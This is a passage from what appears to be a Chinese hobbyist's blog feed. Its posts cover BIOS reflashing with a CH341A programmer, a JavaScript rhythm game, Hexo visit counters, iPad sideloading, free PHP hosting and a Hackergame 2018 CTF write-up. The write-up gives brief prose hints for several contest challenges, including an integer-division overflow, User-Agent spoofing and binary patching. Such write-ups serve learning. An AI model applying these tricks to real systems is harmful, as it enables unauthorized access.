　　另外我的烧录夹是红线对应1号引脚，芯片上从小孔开始逆时针12345678，接下来的接口都1号位对应一号位插就完事儿了。然后就是烧录夹的线插cha341a需要插在靠近USB接口的那几个孔，那是给25用的，而靠近末端的是给24用的。用之前用XTW100没读出来，所以不是很清楚，可能差不多，反正实践出真知，多试几遍就对了。<br>
　　终于，在我生怕压坏主板又怕夹不住的一顿操作之后，夹子夹稳了，芯片型号终于读出来了（虽然和芯片上标的不太一样），数据也终于读出来了，第二行终于出现了5A A5…不过先没急着把原版刷进去，而是先把bios里的数据导出来看看。拿出原先准备烧的bios文件一FC，蹦出来一万个差异。果然，文件根本就没有烧录完整，怪不得黑了。<br>
　　不过还是保险点好，先擦除芯片，结果一下就擦完了。当时以为夹子又没插好，不过点查空过了一分钟提示一空，而且刷新芯片还是能识别芯片规格，于是拿出原版bios文件，点完编程，点校验，校验成功<img src="/articles/bios/1.jpg" alt="这还是图">，再保存出来，和准备刷入的文件一FC，“找不到差异”。成了<br>
　　十分忐忑的打开电脑，在过了比往常开机久一点的几秒之后，终于，MSI的图标出现了！当时我就狂按del键，出现了久违的bios界面，于是我就关机了。<br>
　　后来一想，既然是dos下刷bios刷不完整的问题，那我索性把改过的bios刷上去就完事儿了。第二次的操作比第一次熟练多了，结果发现解锁没成功，改启动图像倒是成功了<br>
　　<img src="/articles/bios/3.jpg" alt="这是启动图"><br>
　　顺便因为我还用的是HDD+Win7，刷完bios之后还得先改设置。总共也就是把快速启动关了，UEFI改成Legacy，RAID改成AHCI，于是就没有出现不断重启进入bios界面的情况了。<br>
　　最后来一张买的工具的合照，虽然最终只用到了ch341a和那个烧录夹，但可以留着备用嘛。<br>
　　<img src="/articles/bios/4.jpg" alt="合影"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>也许是因为过于疲劳，周五晚上的我决定实施早就想实施的Bios解锁+更换启动图像。下载好官网上原版的Bios文件，修改文件时虽然还比较顺利，然后在听信网络上的教程之后，尽管在网上没有找到跟我机型一样的刷Bios的帖子（顺带一提我的机子是GE62-2QF，三年前的微星笔记本），]]>
    </summary>
    
      <category term="Bios" scheme="https://www.xtxtmtxtx.xyz/tags/Bios/"/>
    
      <category term="MSI" scheme="https://www.xtxtmtxtx.xyz/tags/MSI/"/>
    
      <category term="编程器" scheme="https://www.xtxtmtxtx.xyz/tags/%E7%BC%96%E7%A8%8B%E5%99%A8/"/>
    
      <category term="Tech" scheme="https://www.xtxtmtxtx.xyz/categories/Tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[用 HTML5 Canvas 写一个下落音游模拟器！]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/html5mug/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/html5mug/</id>
    <published>2018-11-29T11:30:01.000Z</published>
    <updated>2019-02-27T05:17:52.960Z</updated>
    <content type="html"><![CDATA[<p>越忙越给自己找点感兴趣的事儿做有时候也能改善下心情<del>（拖延）</del>。<br>
　　前几天整了下js，不得不说这东西坑是真的多，对我这种之前写C++<del>（其实写出来像C）</del>的人来说有点不友好。</p>
<p>一开始听说js是弱类型，觉得很方便，就开始放飞自我，完全没考虑数据类型，字符串乘数字、字符串当数字加导致数字溢出之类的操作满.html起飞，好在debug了一万次之后终于慢慢改过来了，最终虽然也有点小问题不过已经和osu!mania的感觉差不多了。</p>
<p>好了，我们先来看怎么玩这个东西<del>（推销）</del>，网站在<a href="https://www.XTXTMTXTX.xyz/SIMPLE_MUG">这里</a> 当然 <a href="http://php.XTXTMTXTX.xyz/SIMPLE_MUG" target="_blank" rel="external">这里</a>也可以，不过那个是放在国外的php免费空间上，可能会导致因加载过慢而卡住的坑。 具体就是读取osu!mania谱面，分析谱面<del>，得出结论</del>，然后只支持4K，因为我懒得根据Key数搞一大堆特判，不过以后说不定会加入7k（咕咕咕）。<br>
　　Bug还有点，也没任何处理错误的语句，不过比较懒，玩起来效果还不错了就这样吧（之前不小心打开了张主模式的图导致我一直以为js写错了又耗了好久，错误处理真的有点必要）。最后还加了个成绩图，不过就不要想和osu是一样的计分规则了，也没有什么缓动动画，然而能玩，能看变速特效，OK了。</p>
<p>然后我们来看看写这么个东西过程中遇到的坑。</p>
<p>首先是变量的类型，因为我不注意写着写着变量变字符串类型了我还以为还是数字，一旦a+b就会越来越长，最后出现奇奇怪怪的问题，debug到死才发现不对劲。<br>
　　然后&lt;script&gt;&lt;/script&gt;的地方也有讲究，放在文档前面就会先于HTML加载出来之前执行，嗯，比较基础，但我就是被坑了会儿<br>
　　canvas绘制过程中需要反复调用draw()，然而如果你在draw()最后requestAnimationFrame (draw())，那就可能递归下去，最终导致浏览器越来越卡（还可能卡爆系统）。<br>
　　在程序块里用var声明的变量在块外都还在，和我以前接触到的实在不一样，比如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1</span>;i++)&#123;</span><br><span class="line">       <span class="keyword">var</span> a=<span class="string">"a"</span>;</span><br><span class="line">&#125;</span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure>
<p>就会弹出&quot;a&quot;。好在没被坑到，想要像c一样的话用let而不是var。<br>
　　removeEventListener的参数要和addEventListener的参数完全一致才可以移除，而且不可以用匿名函数。<br>
　　canvas.height改的是canvas的画布的高度，而canvas.setAttribute(“style”,“height: xxxpx;”);改的是最终显示大小，和canvas.height不一致将会导致canvas画布被缩放。<br>
　　html5的audio.play()有肉眼可见延迟，导致不方便倒计时时间的预判，另外iOS不允许音频自动播放，但我懒得再处理了（本来还想拿ipad试试）。<br>
　　监听触控事件最好在回调函数里开头加上e.preventDefault();不然肯导致移动设备的屏幕缩放之类的事发生。<br>
　　监听触控事件返回的X，Y是相对页面而不是你所监听的对象的坐标，因此处理之前要先吧得到的坐标减掉那个对象的坐标，比方说我关注相对canvas的水平距离，那就e.changedTouches[0].clientX-c.offsetLeft。<br>
　　利用ajax访问本域上的.osu谱面文件时发现404了，可是我明明传上去了，然而直接用浏览器也404。实在没办法就把后缀名改txt，结果成了。不过目前还没什么头绪为什么会这样，可能是php空间的文件处理机制导致的。<br>
　　<br>
　　另外别的想不出来什么了，那就放一下我之前推的根据间隔时间求屏幕像素距离的公式<br>
　　<code>间隔时间*屏幕Y像素/(下落整屏所需时间*当前小节拍子时长*绿线百分比/基准拍子时长)</code><br>
　　这样的话要求当前时间某个物体相对判定线的距离，只要先找到在当前时间之前的最近的一个TimingPoint作为基准TimingPoint，先将基准TimingPoint时间到物件时间之间的所有TimingPoint分割出来的完整的时间区域用上述公式计算距离并累加，再计算最后一小段的时间的距离。同理求当前时间相对基准TimingPoint的距离，减一下就是要求的物件的距离了。<br>
　　<br>
　　完整代码在<a href="https://github.com/XTXTMTXTX/SIMPLE-HTML5-Music-Game/" target="_blank" rel="external">github</a>，目前支持移动设备的触控操作，不过iOS因为各种各样的原因玩不了。然后玩在线谱面可能会因为缓冲块不够而卡住或重放，目前还不知道怎么让它先把整个音频文件加载完。<br>
　　<br>
　　目测会有一段时间不碰js了，打算抽时间恶补写软件时的一些规范，之前搞习惯了oi习惯了那一套格式，现在写大的程序都debug无力<del>（，而且辅导员看了我的github都说我的程序怎么看怎么像C）</del>。<br>
　　<br>
　　最后放一张osu!mania的判定时间图吧，说不定你们也想写呢（笑）。<br>
<img src="/articles/html5mug/o!m_OD_Table.png" alt="这是图"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>越忙越给自己找点感兴趣的事儿做有时候也能改善下心情<del>（拖延）</del>。<br>
　　前几天整了下js，不得不说这东西坑是真的多，对我这种之前写C++<del>（其实写出来像C）</del>的人来说有点不友好。</p>
<p>一开始听说js是弱类型，觉得很方便，就]]>
    </summary>
    
      <category term="Canvas" scheme="https://www.xtxtmtxtx.xyz/tags/Canvas/"/>
    
      <category term="HTML5" scheme="https://www.xtxtmtxtx.xyz/tags/HTML5/"/>
    
      <category term="Javascript" scheme="https://www.xtxtmtxtx.xyz/tags/Javascript/"/>
    
      <category term="Music Game" scheme="https://www.xtxtmtxtx.xyz/tags/Music-Game/"/>
    
      <category term="Osu" scheme="https://www.xtxtmtxtx.xyz/tags/Osu/"/>
    
      <category term="Web" scheme="https://www.xtxtmtxtx.xyz/categories/Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[为博客添加访问统计！]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/TrafficStatistics/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/TrafficStatistics/</id>
    <published>2018-11-21T14:43:45.000Z</published>
    <updated>2018-12-26T09:50:55.658Z</updated>
    <content type="html"><![CDATA[<p>首先我这个博客是拿HEXO弄的，所以理论上别的博客也适用（大概）。<br>
首先就是这个东东啦，叫不蒜子，网站在这里：<a href="https://busuanzi.ibruce.info/" target="_blank" rel="external">busuanzi.ibruce.info</a><br>
网上搜HEXO+访问统计也能搜到讲这个东西的，不过我直接照着别人博客往自己的博客加会出现奇怪问题，后来发现官网上写：<br>
<code>因七牛强制过期『dn-lbstatics.qbox.me』域名，与客服沟通无果，只能更换域名到『busuanzi.ibruce.info』！</code><br>
嗯，破案了。<br>
首先地址要这么弄<br>
<code>脚本：&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code><br>
<code>网站流量统计：&lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;本站总访问量&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;</code><br>
<code>文章流量统计：&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;本站总访问量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;</code><br>
需要注意的是其中pv、uv可以互换，区别就是pv是刷新一次算一次，uv是一个用户最多算一次。</p>
<p>然后就是怎么实装了！</p>
<p>首先找到HEXO文件夹里的\themes\你用的主题\layout\<br>
在这个文件夹及子文件夹\_partial找文件<br>
我用的是clean blog，所以是在\_partial\footer.ejs里放脚本以及网站流量统计，在\_partial\article-full.ejs里放的文章流量统计。<br>
那么怎么放呢？<br>
打开footer.ejs（编辑器自理），在&lt;footer&gt;后换一行加入脚本那一串代码即可，之后也不需要再引用了。然后拉到文件末尾区域，找到你博客类似“copyright”什么什么的文字，自行理解那几行分别是干什么的，然后在你觉得合适的地方插入网站流量统计的那串代码。<br>
然后网站流量统计已经可以用了，不过如果你preview的话会发现那个流量统计的文字出奇的格格不入x<br>
怎么解决呢？在每个&lt;span和紧接其后的id中间插入上下文中相同的class或者style或者之类的<br>
然后再根据原本的文字十分居中在整个统计的那行代码左右分别插入&lt;enter&gt;和&lt;/center&gt;<br>
比如我本来上下文有<code>&lt;p class=&quot;copyright text-muted&quot;&gt;Adapted for &lt;a target=&quot;_blank&quot; href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt; by &lt;a href=&quot;http://www.codeblocq.com/&quot; target=&quot;_blank&quot;&gt;Jonathan Klughertz&lt;/a&gt;&lt;/p&gt;</code><br>
那我就把原本的统计代码弄成<code>&lt;center&gt;&lt;span class=&quot;copyright text-muted&quot; id=&quot;busuanzi_container_site_uv&quot;&gt;本站总访问量&lt;span class=&quot;copyright text-muted&quot; id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span class=&quot;copyright text-muted&quot;&gt;次&lt;/span&gt;&lt;/center&gt;</code><br>
这样就可以配对啦。</p>
<p>然后还有页面的访问量，我的是打开\_partial\article-full.ejs，然后找到类似’&lt;!-- Comments --&gt;'或者之类能看出来表示某一个板块的代码段后加上了文章流量统计代码，为了显得更加和谐，我加入的代码是<code>&lt;center&gt;&lt;span class=&quot;copyright text-muted&quot; id=&quot;busuanzi_container_page_pv&quot;&gt;本文总阅读量&lt;span class=&quot;copyright text-muted&quot; id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span class=&quot;copyright text-muted&quot;&gt;次&lt;/span&gt;&lt;/center&gt;</code>还是看大家想怎么弄自行修改啦。</p>
<p>然后就这么多，看不懂的话，，善用搜索引擎吧（雾）。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>首先我这个博客是拿HEXO弄的，所以理论上别的博客也适用（大概）。<br>
首先就是这个东东啦，叫不蒜子，网站在这里：<a href="https://busuanzi.ibruce.info/" target="_blank" rel="external">busuanz]]>
    </summary>
    
      <category term="HEXO" scheme="https://www.xtxtmtxtx.xyz/tags/HEXO/"/>
    
      <category term="不蒜子" scheme="https://www.xtxtmtxtx.xyz/tags/%E4%B8%8D%E8%92%9C%E5%AD%90/"/>
    
      <category term="博客" scheme="https://www.xtxtmtxtx.xyz/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="访问统计" scheme="https://www.xtxtmtxtx.xyz/tags/%E8%AE%BF%E9%97%AE%E7%BB%9F%E8%AE%A1/"/>
    
      <category term="Web" scheme="https://www.xtxtmtxtx.xyz/categories/Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[不越狱为 iPad 刷 ipa 文件]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/CydiaImpactor/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/CydiaImpactor/</id>
    <published>2018-11-20T13:43:39.000Z</published>
    <updated>2019-02-27T05:18:03.707Z</updated>
    <content type="html"><![CDATA[<p>最近感觉自己又变得更懒了<del>，连澡都不想天天洗了</del>，无论之前订计划时多么雄心壮志，最终难免计划赶不上变化<del>（拖延）</del>，不过<del>迫于压力</del>每天都有在刷leetcode，算是避免生疏吧，你看我现在做个MG动画都一点头绪都莫得，afk太久果然还是不行。<del>然而还是光有脑洞又懒得开坑</del>。<br>
不过这里讲得和编程没什么关系（大概）<br>
总之来说就是分享一个软件</p>
<p>环境：iPad 2018<del>（学生版）</del>，iOS 12.1，Windows 7 64x<br>
<del>铛铛，</del>就是这个小钻头，<img src="/articles/CydiaImpactor/logo.png" alt="Cydia Impactor">，官网在这里：<a href="http://www.cydiaimpactor.com/" target="_blank" rel="external">Cydia Impactor</a> 点进去下载对应平台的程序即可。<br>
虽然本意是被设计来安装越狱软件的，不过事实上甚至可以支持直接在iOS12.1上安装别的不太大的（大概100mb以内）的ipa文件，那么哪里能得到ipa文件呢，<del>点击打开百度，</del><a href="https://www.iphonecake.com/" target="_blank" rel="external">iphonecake.com</a>上可以下载，但是需要梯子才能打开下载链接。另外貌似同一个appleID在同一个设备上最多签名3个ipa文件，需要注意一下。</p>
<p>然后就是步骤了：<br>
首先确保装了iTunes或者相关驱动，将iPad或iPhone或什么什么什么通过数据线连接上电脑（当然需要信任该电脑），打开Impactor.exe，一般来说在第一个下拉框会显示你的设备名。然后不要点击Start，先将菜单Impactor - Insecure SSL勾上，貌似不勾会出现SSL证书错误（当然你也可以不打开“不安全的SSL”试一遍，能成功的话更好啦）。<br>
然后将ipa拖到impactor程序的窗口上，注意官网上说的<br>
<code>Note: Do not &quot;Run as Administrator&quot; Impactor; doing this makes drag/drop of files not work on Windows 10.</code><br>
以管理员模式运行Impactor可能导致无法拖拽文件。<br>
然后会弹框，依次输入AppleID与密码，如果不放心的话可以另外注册一个号，不影响的。<br>
如果出现了如图错误：<img src="/articles/CydiaImpactor/Error.jpg" alt="Error">，原因是开启了两步验证。请登录<a href="https://appleid.apple.com/" target="_blank" rel="external">appleid.apple.com</a>并点击Security - APP-SPECIFIC PASSWORDS - Generate Password…生成一个应用专属密码，复制下来，建议保存一下，因为该密码不会再出现了。再用这个密码代替AppleID密码即可刷入ipa。<br>
最后，打开你的<del>林檎</del>苹果设备，进入设置 - 通用 - 设备管理 - 开发者应用 - 你的AppleID - 点击信任，即可使用刷入的应用了！</p>
<p>注意：刷入的ipa会在七天后失效，请在七天后不要重启设备，或者重启完了重刷一遍即可覆盖。</p>
<p>最后吐槽一下刷进去使用的Duet Display，用着感觉还行，问题是每次双击不管间隔多远都会判定成在一个点双击<del>（直接导致我没法戳屏打osu）</del>。输入延迟还可以，显示延迟稍微有点单不影响日常使用，甚至可以内购Pro来把iPad当数位屏（对不起我没钱买笔）。问题是桌面端程序对独显 极 其 不友好，哪怕不插设备也为有影响（<del>例如R6无法正常启动，LR2变成只有50FPS，</del>听说Adobe系列基本上都出了各种奇奇怪怪的问题），我试了两天就卸载了。</p>
<p>最最后，请不要刷入未知来源的ipa文件，万一出个什么事呢不是吗。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近感觉自己又变得更懒了<del>，连澡都不想天天洗了</del>，无论之前订计划时多么雄心壮志，最终难免计划赶不上变化<del>（拖延）</del>，不过<del>迫于压力</del>每天都有在刷leetcode，算是避免生疏吧，你看我现在做个MG动画都一点头绪都莫得，a]]>
    </summary>
    
      <category term="Cydia Impactor" scheme="https://www.xtxtmtxtx.xyz/tags/Cydia-Impactor/"/>
    
      <category term="iPad" scheme="https://www.xtxtmtxtx.xyz/tags/iPad/"/>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Tech" scheme="https://www.xtxtmtxtx.xyz/categories/Tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[GearHost 上的免费 PHP 空间]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/GearHost/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/GearHost/</id>
    <published>2018-10-25T13:15:00.000Z</published>
    <updated>2019-02-27T05:18:10.956Z</updated>
    <content type="html"><![CDATA[<p>最近闲的没事干（其实腰缠万锅 做点别的舒解一下压力） 正好1元买了个xyz域名 就想着不妨搞个php空间 <del>还可以做些别的事</del><br>
申请很简单 百度一下GearHost就有几篇教程 这里写一下感受</p>
<p>首先服务器是基于IIS的 因此支持php和aspx</p>
<p>然后限制什么的都比较严格 每天60分钟的CPU Time 每月1Gb流量 100Mb存储空间 256Mb运行内存 另外还有10Mb免费数据库（Mysql是5Mb) 按教程的话来讲就最多跑个Wordpress</p>
<p>连接速度应该还行 ping过去250ms左右（ping到我搭在GitHub Page上的blog是100ms）做个博客应该还行</p>
<p>不过有个问题 免费空间不支持SSL 另外我尝试在空间上放<a href="https://github.com/HFIProgramming/mikutap/" target="_blank" rel="external">MikuTap</a>结果加载不出来 然后尝试.htaccess和httpb.ini实现301重定向都失败了 可能我的操作有问题</p>
<p>最后是地址 <a href="http://php.xtxtmtxtx.xyz" target="_blank" rel="external">http://php.xtxtmtxtx.xyz</a> 什么都没有 都是拉的别人源码 目前还没有拿它来做什么的想法<br>
<del>最最最后请不要扫文件（</del></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近闲的没事干（其实腰缠万锅 做点别的舒解一下压力） 正好1元买了个xyz域名 就想着不妨搞个php空间 <del>还可以做些别的事</del><br>
申请很简单 百度一下GearHost就有几篇教程 这里写一下感受</p>
<p>首先服务器是基于IIS的 因此支持php]]>
    </summary>
    
      <category term="GearHost" scheme="https://www.xtxtmtxtx.xyz/tags/GearHost/"/>
    
      <category term="PHP" scheme="https://www.xtxtmtxtx.xyz/tags/PHP/"/>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Web" scheme="https://www.xtxtmtxtx.xyz/categories/Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hackergame 2018]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/Hackergame2018/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/Hackergame2018/</id>
    <published>2018-10-23T11:57:13.000Z</published>
    <updated>2019-02-27T05:18:23.959Z</updated>
    <content type="html"><![CDATA[<p>题目存档：<a href="https://hack2018.lug.ustc.edu.cn/" target="_blank" rel="external">https://hack2018.lug.ustc.edu.cn/</a><br>
官方 write-up 已发布：<a href="https://github.com/ustclug/hackergame2018-writeups" target="_blank" rel="external">https://github.com/ustclug/hackergame2018-writeups</a><br>
我的一些解题过程的源文件<a href="https://github.com/XTXTMTXTX/Hackergame2018" target="_blank" rel="external">https://github.com/XTXTMTXTX/Hackergame2018</a><br>
<del>一度17名最后20名发现奖项居然是中科大校内的 我哭了 你呢.jpg</del></p>
<hr>
<h5 id="签到题"><a class="header-anchor" href="#签到题">¶</a>签到题</h5>
<p>f12把字数限制去了</p>
<hr>
<h5 id="猫咪问答"><a class="header-anchor" href="#猫咪问答">¶</a>猫咪问答</h5>
<p>善用百度</p>
<hr>
<h5 id="游园会的集章卡片"><a class="header-anchor" href="#游园会的集章卡片">¶</a>游园会的集章卡片</h5>
<p>拼拼图<br>
我用的AE</p>
<hr>
<h5 id="猫咪和键盘"><a class="header-anchor" href="#猫咪和键盘">¶</a>猫咪和键盘</h5>
<p>字符拼接 见cat.cpp<br>
然后发现怎么都编译不通过<br>
猜测程序意图<br>
先定义输出格式再输出<br>
ok直接复制粘贴出flag<br>
注意其中一个}和_输出的是十进制ascii值</p>
<hr>
<h5 id="word文档"><a class="header-anchor" href="#word文档">¶</a>WORD文档</h5>
<p>改后缀为zip解压</p>
<hr>
<h5 id="猫咪银行"><a class="header-anchor" href="#猫咪银行">¶</a>猫咪银行</h5>
<p>先兑换一次TDSU<br>
然后购买理财 时长555555555555555555 份额1000 然后取回<br>
恭喜你获得5442144815179344334TDSU 兑换回CTB买flag<br>
#不要买碎片 貌似没用？</p>
<hr>
<h5 id="黑曜石浏览器"><a class="header-anchor" href="#黑曜石浏览器">¶</a>黑曜石浏览器</h5>
<p>HEICORE 联想到红芯(redcore)<br>
马上搜索相关新闻 红芯 user agent 找到红芯用的是Chrome/49.1.2623.213<br>
接下来把浏览器的user agent改为HEICORE/49.1.2623.213再访问页面即可</p>
<hr>
<h5 id="回到过去"><a class="header-anchor" href="#回到过去">¶</a>回到过去</h5>
<p>百度ed编辑器<br>
注意接受下来的按键记录文件藏了个ESC字符 所以后面那个c是假的<br>
事实上我去OpenBSD里试了下 显示ESCc<br>
就很怪 卡了好久</p>
<hr>
<h5 id="我是谁"><a class="header-anchor" href="#我是谁">¶</a>我是谁</h5>
<h6 id="哲学思考"><a class="header-anchor" href="#哲学思考">¶</a>哲学思考</h6>
<p>搜索HTTP 418协议<br>
得到下一题链接</p>
<h6 id="can-i-help-me"><a class="header-anchor" href="#can-i-help-me">¶</a>Can I help me?</h6>
<p>思考 方式 把请求头get改成post一下 得到线索 CRF 7168 <a href="https://www.rfc-editor.org/rfc/rfc7168.txt" target="_blank" rel="external">https://www.rfc-editor.org/rfc/rfc7168.txt</a><br>
好的 自定义请求头BREW 注意附上Content-Type: message/teapot\r\n\<br>
因为不会使用telnet 专门打了个程序 teapot.cpp</p>
<hr>
<h5 id="猫咪遥控器"><a class="header-anchor" href="#猫咪遥控器">¶</a>猫咪遥控器</h5>
<p>按着UDRL移动坐标画图<br>
个人是画在了二维布尔数组上<br>
最后输出方块到txt 改一下字号得flag<br>
详见lazercat.cpp</p>
<hr>
<h5 id="她的诗"><a class="header-anchor" href="#她的诗">¶</a>她的诗</h5>
<p>uuencode<br>
将helper出来的东西再encode回去发现不一样<br>
查询uuencode格式 第一位表示有几个字符<br>
全改成最大的_再跑一遍helper<br>
把多出来的拼起来就好了</p>
<hr>
<h5 id="猫咪克星"><a class="header-anchor" href="#猫咪克星">¶</a>猫咪克星</h5>
<p>单纯的nc操作题<br>
一开始各种文件生成读取特判输出<br>
(甚至硬核模拟键盘)<br>
等我做完别人告诉我有eval()???<br>
流下了不会python的眼泪<br>
我的代码详见\pythoncat</p>
<hr>
<h5 id="c语言作业"><a class="header-anchor" href="#c语言作业">¶</a>C语言作业</h5>
<p>源程序用ida f5反编译<br>
注意init函数与_err函数<br>
以及main中的强制转换<br>
可以得出2147483648(2^31)/-1在强转后可以满足跳转_err条件<br>
_err中可以让你执行没有传入参数的程序<br>
一开始思考cat 显然无法<br>
后来想起来可以打开编辑器<br>
ed没有vi没有<br>
vim蹦出来了<br>
:open flag发现flag在-文件中<br>
重来一遍<br>
:open -得到flag<br>
顺便windows下vim界面会十分鬼畜 建议linux下进行操作</p>
<hr>
<h5 id="加密算法和解密算法"><a class="header-anchor" href="#加密算法和解密算法">¶</a>加密算法和解密算法</h5>
<p>先是bf语言<br>
其实还好看懂<br>
层层剖析之后发现了算法<br>
发现解密就是解一个模64条件下的10元一次方程组<br>
克拉默法则<br>
求出D=5 乘法逆元13<br>
接下来依次求D1~10<br>
det计算程序来源<a href="http://www.voidcn.com/article/p-rvomqytj-bb.html" target="_blank" rel="external">http://www.voidcn.com/article/p-rvomqytj-bb.html</a><br>
源代码见\bf</p>
<hr>
<h5 id="她的礼物"><a class="header-anchor" href="#她的礼物">¶</a>她的礼物</h5>
<p>“用你朋友的脚本解密之后的第 10 行”输入./gift &quot;However, someday, someone will find it.&quot;<br>
跑了几秒就挂掉了<br>
进ida反编译<br>
发现循环233333次<br>
把sleep alarm signal循环内printf全弄没<br>
（怎么弄？ ida隐藏patch二进制功能）<br>
然后再跑一次 最好 ./gift “However, someday, someone will find it.” &gt; output.txt<br>
等它跑完就完了<br>
直接循环1次？输出结果不对<br>
最好本机linux跑 我虚拟机跑了一小时才出来结果<br>
（流下了不用linux的眼泪）<br>
<del>(最后发现是没弄掉io)</del><br>
patched file见\gift</p>
<hr>
<h5 id="一些宇宙真理"><a class="header-anchor" href="#一些宇宙真理">¶</a>一些宇宙真理</h5>
<p>snark.hpp内的<br>
verify_proof()<br>
调用即可<br>
魔改代码使程序读入指定vk proof<br>
见lightning_circuit_solve</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>题目存档：<a href="https://hack2018.lug.ustc.edu.cn/" target="_blank" rel="external">https://hack2018.lug.ustc.edu.cn/</a><br>
官方 write-up 已发布]]>
    </summary>
    
      <category term="C++" scheme="https://www.xtxtmtxtx.xyz/tags/C/"/>
    
      <category term="CTF" scheme="https://www.xtxtmtxtx.xyz/tags/CTF/"/>
    
      <category term="Linux" scheme="https://www.xtxtmtxtx.xyz/tags/Linux/"/>
    
      <category term="Reverse" scheme="https://www.xtxtmtxtx.xyz/tags/Reverse/"/>
    
      <category term="Tech" scheme="https://www.xtxtmtxtx.xyz/categories/Tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[无言投下]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/%E6%97%A0%E8%A8%80%E6%8A%95%E4%B8%8B/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/无言投下/</id>
    <published>2018-10-06T21:21:12.000Z</published>
    <updated>2019-03-10T14:56:45.926Z</updated>
    <content type="html"><![CDATA[<p>一转眼两年多过去了 而我只投了一份视频<del>（还不是因为你懒）</del><br>
其实本意是想着高考完了可以多挖点坑 实际上又没填旧坑 也没开新坑<br>
怎么说呢 也没什么好说的 大学开学了比想象中的更累（？）<br>
其实应该是比不上高三那会儿那么任务繁重的 可能是自己变懒了吧<br>
想想今后这个博客可能还是得积灰 尽可能多的写些杂事吧<br>
<del>比如debug失败爆出了什么奇妙错误啊啥啥啥的</del><br>
感觉自己就是 所谓三分钟（也许是三天、三个月？）热情<br>
从一开始的目标top 到最后失去兴趣只会对着桌面发呆<br>
<del>（现在靠着deadline过活）</del></p>
<p>总之顺便看看能不能把以前写那几个工具时的过程感受再回忆一下写出来充实一下这里？<br>
不然的话也没什么好写了 没有记日记的习惯 每天都像过流水账</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>一转眼两年多过去了 而我只投了一份视频<del>（还不是因为你懒）</del><br>
其实本意是想着高考完了可以多挖点坑 实际上又没填旧坑 也没开新坑<br>
怎么说呢 也没什么好说的 大学开学了比想象中的更累（？）<br>
其实应该是比不上高三那会儿那么任务繁重的 可能]]>
    </summary>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Others" scheme="https://www.xtxtmtxtx.xyz/categories/Others/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(已弃坑)BGA:Kreuz]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/Kreuz/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/Kreuz/</id>
    <published>2016-08-07T16:00:00.000Z</published>
    <updated>2019-02-26T15:57:30.779Z</updated>
    <content type="html"><![CDATA[<p>Kreuz是十字架的德语说法，原BGA是FRENZ2014的参赛作品<a href="http://www.bilibili.com/video/av1756222/" target="_blank" rel="external">链接:av1756222</a><br>
其实这个坑大概是要等到明年才会去填的，因为怕到时候忘了所以在这里留个记录。<br>
说起来好像做BGA的人都比较喜欢用德语啊，然后大部分都是跟时间、齿轮、魔法阵有关的，不知道是什么含义呢？<br>
原BGA缩略图:<br>
<img src="https://ooo.0o0.ooo/2016/08/07/57a75311c80ac.jpg" alt="1"></p>
<hr>
<blockquote>
<p>总长<code>02:09</code></p>
</blockquote>
<blockquote>
<p>音频</p>
<blockquote>
<p>未开始</p>
</blockquote>
</blockquote>
<blockquote>
<p>视频</p>
<blockquote>
<p>未开始</p>
</blockquote>
</blockquote>
<hr>
<p><del>坑挖的好像有点大了会不会弃全看人品</del></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Kreuz是十字架的德语说法，原BGA是FRENZ2014的参赛作品<a href="http://www.bilibili.com/video/av1756222/" target="_blank" rel="external">链接:av1756222</a><br>
]]>
    </summary>
    
      <category term="音MAD" scheme="https://www.xtxtmtxtx.xyz/tags/%E9%9F%B3MAD/"/>
    
      <category term="Video" scheme="https://www.xtxtmtxtx.xyz/categories/Video/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(已填完)天坑预告x]]></title>
